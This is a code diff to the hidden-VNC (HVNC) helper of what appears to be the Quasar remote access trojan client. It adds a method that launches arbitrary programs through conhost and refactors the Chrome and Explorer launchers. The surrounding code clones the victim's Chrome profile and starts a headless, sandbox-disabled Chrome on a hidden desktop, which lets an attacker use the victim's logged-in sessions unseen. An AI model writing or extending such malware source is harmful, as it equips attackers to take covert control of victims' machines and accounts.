@@ -83,6 +83,12 @@ namespace Quasar.Client.Helper.HVNC
             this.CreateProc(path);
         }
 
+        public void StartGeneric(string path)
+        {
+            string command = "conhost " + path;
+            this.CreateProc(command);
+        }
+
         public void StartFirefox()
         {
             string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
@@ -189,16 +195,15 @@ namespace Quasar.Client.Helper.HVNC
             this.CreateProc(filePath2);
         }
 
-        public bool Startchrome()
+        public void Startchrome()
         {
-            bool result;
             try
             {
                 string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";
 
                 if (!Directory.Exists(path))
                 {
-                    return true;
+                    return;
                 }
 
                 string sourceDir = Path.Combine(path, "User Data");
@@ -216,16 +221,17 @@ namespace Quasar.Client.Helper.HVNC
                     this.Startchrome();
                 }
                 string filePath2 = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
-                result = this.CreateProc(filePath2);
+                this.CreateProc(filePath2);
             }
-            catch
+            catch (Exception ex)
             {
-                result = false;
+                Debug.WriteLine("Error starting Chrome: " + ex.Message);
+                return;
             }
-            return result;
+            return;
         }
 
-        public bool StartExplorer()
+        public void StartExplorer()
         {
             uint num = 2U;
             string name = "TaskbarGlomLevel";
@@ -246,7 +252,7 @@ namespace Quasar.Client.Helper.HVNC
                 }
             }
             string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
-            return this.CreateProc(explorerPath);
+            this.CreateProc(explorerPath);
         }
 
         public bool CloseProc(string filePath)
